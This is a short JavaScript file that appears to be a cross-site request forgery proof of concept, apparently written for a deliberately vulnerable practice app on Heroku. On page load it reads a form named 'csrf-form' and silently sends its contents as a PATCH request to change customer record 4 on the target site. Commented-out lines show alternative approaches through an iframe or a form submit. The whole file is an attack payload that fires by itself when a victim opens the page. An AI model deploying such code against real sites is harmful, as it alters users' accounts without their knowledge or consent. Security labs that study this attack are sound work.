window.addEventListener("DOMContentLoaded", () => {
	// const iframe = document.getElementById("csrf-iframe");
  // const form = iframe.contentWindow.document.querySelector('#csrf-form');
  const form = document.querySelector('#csrf-form');
  // const form = document.getElementById('csrf-form');

  const formData = new FormData(form);
  console.log(formData)
  const XHR = new XMLHttpRequest(formData);
    XHR.open("PATCH", "https://vulnerable-app1.herokuapp.com/customers/4", true);
    XHR.responseType = "json";
    XHR.send(formData);
    XHR.onload = () => {
      if (form) return false;
    }
  // form.submit()
})
